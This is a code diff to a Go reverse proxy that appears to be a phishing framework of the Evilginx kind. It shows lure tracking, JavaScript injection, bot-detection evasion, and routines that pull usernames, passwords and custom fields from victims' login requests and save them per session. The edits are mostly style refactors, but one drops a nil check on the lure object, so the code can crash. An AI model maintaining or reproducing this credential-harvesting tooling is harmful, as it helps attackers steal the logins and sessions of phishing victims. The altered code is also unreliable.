@@ -465,7 +465,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			remote_addr := from_ip
 
 			// --- Begin Botguard telemetry endpoint ---
-			botguard_tel_re := regexp.MustCompile("^\\/api\\/v1\\/analytics$")
+			botguard_tel_re := regexp.MustCompile(`^/api/v1/analytics$`)
 			if botguard_tel_re.MatchString(req.URL.Path) && req.Method == "POST" {
 				// Handle telemetry collection
 				body, err := ioutil.ReadAll(req.Body)
@@ -723,8 +723,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			// --- End Botguard bot detection ---
 
-			redir_re := regexp.MustCompile("^\\/assets\\/js\\/([^\\/]*)")
-			js_inject_re := regexp.MustCompile("^\\/assets\\/js\\/([^\\/]*)\\/([^\\/]*)")
+			redir_re := regexp.MustCompile(`^/assets/js/([^/]*)`)
+			js_inject_re := regexp.MustCompile(`^/assets/js/([^/]*)/([^/]*)`)
 
 			if js_inject_re.MatchString(req.URL.Path) {
 				ra := js_inject_re.FindStringSubmatch(req.URL.Path)
@@ -1014,7 +1014,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									// Send lure_clicked notification
 									lureUrl := ""
-									if l != nil && l.Path != "" {
+									if l.Path != "" {
 										lureUrl = fmt.Sprintf("https://%s%s", req.Host, l.Path)
 									}
 									p.notifier.Trigger(EventLureClicked, &NotificationData{
@@ -1383,7 +1383,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						rurl := pl.GetLoginUrl()
 						u, err := url.Parse(rurl)
 						if err == nil {
-							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
+							if !strings.EqualFold(req_path, u.Path) {
 								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 								if resp != nil {
 									resp.Header.Add("Location", rurl)
@@ -1585,14 +1585,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						contentType := req.Header.Get("Content-type")
 
-						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
-						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")
+						json_re := regexp.MustCompile(`application/\w*\+?json`)
+						form_re := regexp.MustCompile(`application/x-www-form-urlencoded`)
 
 						if json_re.MatchString(contentType) {
 
 							if pl.username.tp == "json" {
 								um := pl.username.search.FindStringSubmatch(string(body))
-								if um != nil && len(um) > 1 {
+								if len(um) > 1 {
 									p.setSessionUsername(ps.SessionId, um[1])
 									log.Success("[%d] Username: [%s]", ps.Index, um[1])
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
@@ -1603,7 +1603,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							if pl.password.tp == "json" {
 								pm := pl.password.search.FindStringSubmatch(string(body))
-								if pm != nil && len(pm) > 1 {
+								if len(pm) > 1 {
 									p.setSessionPassword(ps.SessionId, pm[1])
 									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
@@ -1615,7 +1615,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							for _, cp := range pl.custom {
 								if cp.tp == "json" {
 									cm := cp.search.FindStringSubmatch(string(body))
-									if cm != nil && len(cm) > 1 {
+									if len(cm) > 1 {
 										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
@@ -1697,7 +1697,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								// Extract username from URL-decoded body
 								if pl.username.search != nil {
 									um := pl.username.search.FindStringSubmatch(decodedBody)
-									if um != nil && len(um) > 1 {
+									if len(um) > 1 {
 										p.setSessionUsername(ps.SessionId, um[1])
 										log.Success("[%d] Username: [%s]", ps.Index, um[1])
 										if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
@@ -1715,7 +1715,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										parts := strings.SplitN(kv, "=", 2)
 										if len(parts) == 2 && pl.password.key.MatchString(parts[0]) {
 											pm := pl.password.search.FindStringSubmatch(parts[1])
-											if pm != nil && len(pm) > 1 && pm[1] != "" {
+											if len(pm) > 1 && pm[1] != "" {
 												p.setSessionPassword(ps.SessionId, pm[1])
 												log.Success("[%d] Password (form field): [%s]", ps.Index, pm[1])
 												if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
@@ -3097,7 +3097,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				s, ok := p.sessions[ps.SessionId]
 				if ok && s.IsDone {
 					if s.RedirectURL != "" && s.RedirectCount == 0 {
-						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
+						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Contains(string(body), "</head>") || strings.Contains(string(body), "</body>")) {
 							// redirect only if received response content is of `text/html` content type
 							s.RedirectCount += 1
 							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
